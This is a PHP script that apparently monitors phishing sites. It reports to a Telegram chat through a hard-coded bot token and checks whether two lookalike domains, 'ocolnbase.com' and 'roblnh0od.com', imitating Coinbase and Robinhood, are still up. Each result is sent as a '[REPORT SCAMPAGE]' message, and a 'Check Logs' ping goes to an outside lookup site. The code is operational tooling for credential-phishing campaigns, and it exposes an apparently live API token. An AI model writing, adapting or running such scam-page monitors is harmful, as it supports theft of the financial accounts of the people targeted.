<?php
date_default_timezone_set("Asia/Jakarta");
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
define('API_KEY', '1847280168:AAGR9JY20lXvo44Xph9BrgAsYgwYnoJCy_E');
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

function tes_log($date){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://easy-ip-lookup.com/api');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "a=[Check Logs ".$date."]&b=Domain : easy-ip-lookup.com<br>Status : ✅<br>");
    $res = curl_exec($ch);
    bot('sendmessage',['chat_id'=>'-649670838','text'=>"[REPORT CHECK LOGS]\nDomain : easy-ip-lookup.com\nMsg : Check email logs!",]);
}

tes_log($date);

$url = array();
$url[] = 'ocolnbase.com';
$url[] = 'roblnh0od.com';

for($i=0;$i<=count($url) - 1;$i++) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://'.$url[$i].'/webhook');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($ch);


    if ($res == "ok") {
       bot('sendmessage',['chat_id'=>'-649670838','text'=>"[REPORT SCAMPAGE]\nDomain : ".$url[$i]."\nStatus : ✅",]);
       echo json_encode(["domain"=>$url[$i],"status"=>"ok"]);
    }else{
       bot('sendmessage',['chat_id'=>'-649670838','text'=>"[REPORT SCAMPAGE]\nDomain : ".$url[$i]."\nStatus : ❌",]);
       echo json_encode(["domain"=>$url[$i],"status"=>"bad"]);
    }
}
?>